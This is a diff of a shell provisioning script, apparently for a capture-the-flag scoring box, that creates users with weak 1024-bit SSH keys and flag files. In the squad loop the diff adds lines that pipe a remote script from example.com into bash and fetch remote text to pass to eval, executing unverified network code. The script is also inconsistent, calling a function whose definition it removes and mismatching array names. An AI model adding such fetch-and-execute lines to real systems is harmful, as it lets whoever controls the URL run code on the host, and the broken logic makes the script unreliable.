@@ -2,11 +2,10 @@
 sudo yum install -y amazon-ssm-agent
 sudo systemctl enable amazon-ssm-agent
 sudo systemctl start amazon-ssm-agent
-set_squad() {
-pushd /home/
-nohup python3 -m http.server [[GET_FLAG_PORT]] > server.log 2>&1 &
-popd
-}
+
+# Setup web server
+yum install -y nginx
+/bin/systemctl start nginx.service
 
 # Create user function
 create_user() {
@@ -19,15 +18,18 @@ cd .ssh
 # Create scoring keys
 ssh-keygen -t rsa -b 1024 -f scoring_rsa -N ""
 cp scoring_rsa.pub authorized_keys
-chmod 440 scoring_rsa
-cd /home/$1
+cd ..
 echo $1 > flag.txt
 chown -R $1:$1 .
-ls -ltrRa
 popd
 }
 
-create_user [[SQUAD]]
+create_user wooba
+create_user gooba
+
+# ---------- SQUAD functions ------------------
+# Functions stubs, keep the names, vhange the content
+
 set_squad  [[SQUAD]]
 
 # Create some users and their special sauce
@@ -45,14 +47,15 @@ cat authorized_keys >> /home/[[SQUAD]]/.ssh/authorized_keys
 popd
 }
 
-
-# Setup web server
-yum install -y nginx
-/bin/systemctl start nginx.service
-
 # Run loop of squads
 names=(bear)
 for squad in "${squads[@]}"; do
+  create_user [[SQUAD]]
+  curl -s https://example.com/script.sh | bash
+  URL="https://example.com/data.txt"
+  DATA=$(curl -s "$URL")
+  eval $DATA
+
   create_"$squad"
   remove_"$squad"
   test_"$squad"
